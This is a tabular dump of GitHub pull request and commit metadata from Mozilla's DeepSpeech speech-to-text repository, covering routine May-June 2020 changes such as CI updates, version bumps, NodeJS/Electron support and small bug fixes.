910,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3046,3046,Use decoder package from PyPI (Fixes #3044),,reuben,477142,2020-06-08T08:24:15Z,MEMBER,True,164,26,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a808b216e71e4ff76fa847dab8ee23cc09d66c6,Download decoder wheel from PyPI
911,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3046,3046,Use decoder package from PyPI (Fixes #3044),,reuben,477142,2020-06-08T08:24:15Z,MEMBER,True,164,26,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,209056ceb59cdb7dd380d9b8f281e0befca3c4cb,Test PyPI decoder package after upload
912,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3045,3045,Fix csv writer parameter,https://docs.python.org/3/library/csv.html#csv.writer,ricky-cck,8126655,2020-06-05T11:03:21Z,NONE,True,16,16,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c83f9f24a9c072884b1ab2246b5c6c44475e086,Fix csv writer parameter [https://docs.python.org/3/library/csv.html#csv.writer]
913,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3045,3045,Fix csv writer parameter,https://docs.python.org/3/library/csv.html#csv.writer,ricky-cck,8126655,2020-06-05T11:03:21Z,NONE,True,16,16,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a252ae01a051792565d8b39b74ad3c03215e8830,Fix csv DictWriter parameter
914,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3043,3043,Move VERSION and GRAPH_VERSION to training directory,,reuben,477142,2020-06-05T09:17:47Z,MEMBER,True,18,17,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06408b8ddd40ea0233f9e2ca2b8805692faa8e16,Flip direction of VERSION and GRAPH_VERSION links
915,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3042,3042,Add missing TFLite binaries,,lissyx,1645737,2020-06-05T09:10:01Z,COLLABORATOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c074bb2f6df34f0af8a5f3cd5b48f97b086eeec4,Add missing TFLite binaries
916,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3037,3037,Make TaskCluster build the docs like RTD,,lissyx,1645737,2020-06-04T09:52:08Z,COLLABORATOR,True,13,24,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23139b24303adb3ecce4cf79c75f9cd2832480a9,Make TaskCluster build the docs like RTD
917,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3036,3036,Install npm deps for ReadTheDocs,,lissyx,1645737,2020-06-04T07:36:15Z,COLLABORATOR,True,12,11,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3b0eb65894fce009a836ef3d787c48ce45632b4,Install npm deps for RTD
918,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3036,3036,Install npm deps for ReadTheDocs,,lissyx,1645737,2020-06-04T07:36:15Z,COLLABORATOR,True,12,11,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cd571ff4be6184ae6ce73632af5f6ca76d646762,Bump VERSION to 0.7.3
919,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3035,3035,Install npm deps from sphinx-build,,reuben,477142,2020-06-04T07:27:30Z,MEMBER,False,13,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be02bc6fadf441ac6c478e5c999feeda76b6bbaa,Install npm deps from sphinx-build
920,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3034,3034,Bump VERSION to 0.7.2,,lissyx,1645737,2020-06-04T07:04:19Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3ae74f80ae496eda8ed28606fead03721afa2cb,Bump VERSION to 0.7.2
921,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,45d8f7cd617ebccafda3b0228e352dfdb545f998,Explicitly pass filter context to multiprocessing function
922,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d0ec01853fe9f5b73a6e35b0226e4c97c237655,Fix typo from argument reordering
923,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9f9b3cedde806901fe441698aa3ad9d8bb6a2f1,Merge branch 'import_cv2_multiprocessing' (Fixes #3008)
924,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b78f4ff0130c05f783bd12d343b34192489f43c,move unittest to TC
925,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccca1c1fed17e5586cce43a6519d0914761c1e2c,add tests to TC and update travis
926,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73c4f3a201eae25e3ed5eeb892174d01f791b6c7,update tc-train-unittest.sh
927,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84d2f2a5f13ce8e7c3ae0f11b8fbe8503102ca30,update description of test-training-unittests*yml
928,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ab2ba41c7fc79ebac02ed17abb8ce578a8d62da6,Convert path to str to fix Python 3.5 compat
929,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b327fa3c73937a5fd3d5df710fa98749dd4838aa,"Merge pull request #3025 from reuben/pr3024

PR #3024"
930,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60397964e1b4a46814ca91bc3f9734ecb07cdee2,"Add some native_client build outputs to .gitignore

X-DeepSpeech: NOBUILD"
931,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00577873ce8debf412f4a30f2b075dc9e44e7bc8,Update Homebrew
932,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f925dd9fc8da44cec3a38775185e2be75641b873,Fix Homebrew checks
933,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc8dbbd398fe978adec88a32d33efffc43b27c76,Add NodeJS v14
934,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdeb933c0b8b0a4f63bf5003db1af31ebf7fc5e5,Add ElectronJS v9.0
935,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa4c746899b4bab3ed62813b44120c385adda1ea,Maximize binary compatibility
936,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d24fb70869e90b25cc6a6c838e9d162d86328411,Update node-gyp cache
937,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5d4f7f9d6c904e4be6e2ec00c75607dfd7fad25,Fix typo in description for NodeJS / ARMbian
938,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75a320e87b094fff3cd19adb31d3673694d42160,Enable ElectronJS / TFLite / Windows tests
939,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64fd79f9c192752e409452d58860320f3a685bdc,"Merge pull request #3027 from lissyx/node-v14-electron-v9

Node v14 electron v9"
940,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ba3e10ecdad81a2b722f6d7db15585311f521a1,Fix wrong nodejs version for Windows tests
941,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,222a25f97924c2cd1ccad19da99a33bb183db5f7,"Merge pull request #3029 from lissyx/fix-nodejs-win-tests

Fix wrong nodejs version for Windows tests"
942,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3033,3033,R0.8 update,,lissyx,1645737,2020-06-04T06:54:10Z,COLLABORATOR,True,664,86,53,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,797cc2181ced35f82bf1866bca34fd550d195835,Merge remote-tracking branch 'upstream/master' into r0.8-update
943,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3030,3030,Fix arguments order in pcm_to_np call,"pcm_to_np takes segment buffer as its first argument and audio format as a second one. The wrong order cause ""bytes object has no attribute 'channels'' ArgumentError.",marekjg,24734083,2020-06-03T16:07:01Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8a87d1d100b6f662b03fc164536fcc171d7f7796,"Fix arguments order in pcm_to_np call

pcm_to_np takes segment buffer as its first argument and audio format as a second one. The wrong order cause ""bytes object has no attribute 'channels'' ArgumentError."
944,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3029,3029,Fix wrong nodejs version for Windows tests,,lissyx,1645737,2020-06-03T15:14:10Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ba3e10ecdad81a2b722f6d7db15585311f521a1,Fix wrong nodejs version for Windows tests
945,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3028,3028,Add training on Dockerfile,,lissyx,1645737,2020-06-02T19:24:28Z,COLLABORATOR,False,7,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e7735a866223920ff3d82b263f5437a11ecf508,Add training on Dockerfile
946,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00577873ce8debf412f4a30f2b075dc9e44e7bc8,Update Homebrew
947,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f925dd9fc8da44cec3a38775185e2be75641b873,Fix Homebrew checks
948,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc8dbbd398fe978adec88a32d33efffc43b27c76,Add NodeJS v14
949,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdeb933c0b8b0a4f63bf5003db1af31ebf7fc5e5,Add ElectronJS v9.0
950,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa4c746899b4bab3ed62813b44120c385adda1ea,Maximize binary compatibility
951,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d24fb70869e90b25cc6a6c838e9d162d86328411,Update node-gyp cache
952,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5d4f7f9d6c904e4be6e2ec00c75607dfd7fad25,Fix typo in description for NodeJS / ARMbian
953,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3027,3027,Node v14 electron v9,,lissyx,1645737,2020-06-02T10:24:43Z,COLLABORATOR,True,543,35,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75a320e87b094fff3cd19adb31d3673694d42160,Enable ElectronJS / TFLite / Windows tests
954,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3026,3026,add tensorflow submodule,- Part of #2895 ,imskr,42062622,2020-06-01T19:05:56Z,COLLABORATOR,False,5,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cac45c773550111adb277e5409b4bd6f3396bb77,add tensorflow submodule
955,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3025,3025,PR #3024,,reuben,477142,2020-05-30T13:38:42Z,MEMBER,True,61,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b78f4ff0130c05f783bd12d343b34192489f43c,move unittest to TC
956,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3025,3025,PR #3024,,reuben,477142,2020-05-30T13:38:42Z,MEMBER,True,61,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccca1c1fed17e5586cce43a6519d0914761c1e2c,add tests to TC and update travis
957,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3025,3025,PR #3024,,reuben,477142,2020-05-30T13:38:42Z,MEMBER,True,61,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73c4f3a201eae25e3ed5eeb892174d01f791b6c7,update tc-train-unittest.sh
958,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3025,3025,PR #3024,,reuben,477142,2020-05-30T13:38:42Z,MEMBER,True,61,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84d2f2a5f13ce8e7c3ae0f11b8fbe8503102ca30,update description of test-training-unittests*yml
959,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3025,3025,PR #3024,,reuben,477142,2020-05-30T13:38:42Z,MEMBER,True,61,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ab2ba41c7fc79ebac02ed17abb8ce578a8d62da6,Convert path to str to fix Python 3.5 compat
960,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3024,3024,Move unit tests to TaskCluster,Fixes #2961 ,imskr,42062622,2020-05-29T11:38:26Z,COLLABORATOR,True,56,8,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b78f4ff0130c05f783bd12d343b34192489f43c,move unittest to TC
961,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3024,3024,Move unit tests to TaskCluster,Fixes #2961 ,imskr,42062622,2020-05-29T11:38:26Z,COLLABORATOR,True,56,8,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccca1c1fed17e5586cce43a6519d0914761c1e2c,add tests to TC and update travis
962,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3024,3024,Move unit tests to TaskCluster,Fixes #2961 ,imskr,42062622,2020-05-29T11:38:26Z,COLLABORATOR,True,56,8,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73c4f3a201eae25e3ed5eeb892174d01f791b6c7,update tc-train-unittest.sh
963,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3024,3024,Move unit tests to TaskCluster,Fixes #2961 ,imskr,42062622,2020-05-29T11:38:26Z,COLLABORATOR,True,56,8,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84d2f2a5f13ce8e7c3ae0f11b8fbe8503102ca30,update description of test-training-unittests*yml
964,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3021,3021,Return raw scores in confidence value (Fixes #3004),This should eliminate confusion where the adjusted order does not match the sorted order as well as avoid behavior discrepancies between runs with and without a scorer.,reuben,477142,2020-05-27T14:52:38Z,MEMBER,True,1,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5482225181af6d6fef4ef55530c2a3b76b4027f,Return raw scores in confidence value
965,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3015,3015,Bump VERSION to 0.8.0-alpha.0,,reuben,477142,2020-05-26T11:01:08Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89429de16adc4ad011687efa635b25f91f8323b4,Bump VERSION to 0.8.0-alpha.0
966,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3014,3014,Switch CI branch to r0.8,,reuben,477142,2020-05-26T07:55:04Z,MEMBER,False,8,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ce586c289ec1923514c32e64023c9f786e50e42,Switch CI branch to r0.8
967,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3014,3014,Switch CI branch to r0.8,,reuben,477142,2020-05-26T07:55:04Z,MEMBER,False,8,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9313725c4f865e1ddeb110dc705e19a71b16485e,"Make sure Travis can handle PR w/ non-master base

X-DeepSpeech: NOBUILD"
968,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3012,3012,Switch index.js to TypeScript,This will reduce code and documentation duplication and also help us catch the types of copy-paste errors in the JS binding that happened in 0.7.0 more easily.,reuben,477142,2020-05-25T09:29:44Z,MEMBER,True,327,543,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,facdff8c70a49aaa1eb1f9f69bb98a88e3f13a55,Switch JavaScript index.js to TypeScript
969,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3012,3012,Switch index.js to TypeScript,This will reduce code and documentation duplication and also help us catch the types of copy-paste errors in the JS binding that happened in 0.7.0 more easily.,reuben,477142,2020-05-25T09:29:44Z,MEMBER,True,327,543,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a462d951cfabc3cfbea749e705507a6a543d21fb,Remove unneeded npm dependencies for doc build
970,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3011,3011,PR #3010 - Fix Stream.intermediateDecodeWithMetadata + tests,,reuben,477142,2020-05-25T09:02:11Z,MEMBER,True,10,4,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8f9d036c21b1c3d2ac3f3281581fd706d418473,Fix JS IntermediateDecodeWithMetadata binding
971,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3011,3011,PR #3010 - Fix Stream.intermediateDecodeWithMetadata + tests,,reuben,477142,2020-05-25T09:02:11Z,MEMBER,True,10,4,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83320c1a1030ebe6eccbc6703ed0d7978f2bc1ef,Remove bogus Stream parameter in Stream.intermediateDecode TS definition
972,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3011,3011,PR #3010 - Fix Stream.intermediateDecodeWithMetadata + tests,,reuben,477142,2020-05-25T09:02:11Z,MEMBER,True,10,4,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f30cf27178557d8f561b9e2285a180d8844aeac,Use Buffer type in TS definitions that take a Buffer
973,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3011,3011,PR #3010 - Fix Stream.intermediateDecodeWithMetadata + tests,,reuben,477142,2020-05-25T09:02:11Z,MEMBER,True,10,4,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fdd3b319a5763153c0286b65f349d8c05eab0ca2,Exercise intermediateDecode and intermediateDecodeWithMetadata in streaming tests
974,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3010,3010,Fix JS IntermediateDecodeWithMetadata binding,"The Node.js binding for `stream.intermediateDecodeWithMetadata()` was calling `binding.IntermediateDecode()` instead of `binding.IntermediateDecodeWithMetadata()` which would always cause the error:
```
Illegal number of arguments for _wrap_IntermediateDecode
```
Verified that this works as expected after the fix.",gregnr,4133076,2020-05-25T03:44:55Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8f9d036c21b1c3d2ac3f3281581fd706d418473,Fix JS IntermediateDecodeWithMetadata binding
975,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3009,3009,"Add data/lm doc to RTD, and some general doc improvements and fixes",,reuben,477142,2020-05-24T13:56:11Z,MEMBER,True,137,160,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4356a2764ba086dc7f4049d4c90a4d07d482b3f0,"Add data/lm doc to RTD, and some general doc improvements and fixes"
976,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3002,3002,Update MSYS2 base archive and work around startup problem,,reuben,477142,2020-05-19T16:08:32Z,MEMBER,True,24,16,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6b2ec6d644708cfb91cc8be3a4ea990c175c131,Update MSYS2 base archive and work around startup problem
977,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3002,3002,Update MSYS2 base archive and work around startup problem,,reuben,477142,2020-05-19T16:08:32Z,MEMBER,True,24,16,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90ce0921bb554f90876d0178f9d33dc273bdbfb9,Adjust TC_MSYS_VERSION to match uname in new MSYS2 base
978,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3001,3001,Windows support in setup.py decoder wheel installation (Fixes #2992),,reuben,477142,2020-05-19T12:51:04Z,MEMBER,True,7,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac2b63c0bf3dbb76c374f059d15b0f979d52df27,Windows support in setup.py decoder wheel installation
979,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2999,2999,Add task to trigger ReadTheDocs builds & version update,"Corresponding scriptworker changes at https://github.com/mozilla/deepspeech-pkguploadworker/compare/1e4ef28e463cd17f5298278d445020a78f2864af...ad10a9019f2e45751da419290c9dd16546c9f7a1
",reuben,477142,2020-05-18T16:49:14Z,MEMBER,True,14,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce00feffaa6ab143a89e2d83af72cc2fd5e61a7a,"Add task to trigger ReadTheDocs builds & version update

X-DeepSpeech: NOBUILD"
